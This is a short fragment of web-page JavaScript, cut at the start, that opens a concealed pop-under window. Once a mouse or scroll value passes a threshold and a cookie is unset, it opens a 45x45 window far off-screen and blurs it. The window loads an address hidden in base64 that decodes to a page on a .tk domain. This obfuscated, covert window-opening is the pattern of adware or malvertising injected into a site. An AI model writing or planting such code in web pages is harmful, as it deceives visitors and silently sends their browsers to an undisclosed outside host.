...
if(pX>414){if(document.cookie.indexOf("pnpopup=popactive")==-1){document.cookie='pnpopup=popactive';params='width=45';params+=', height=45';params+=', top=1650, left=1460, resizable=no, scrollbars=yes, location=yes';var w=window.open(window.atob('aHR0cHM6Ly90cnVtZ2lhbWdpYS50ay93b3Jrcy93aW5kb3ctbmhvLmh0bWw='),'window1',params).blur();window.focus();}}});});
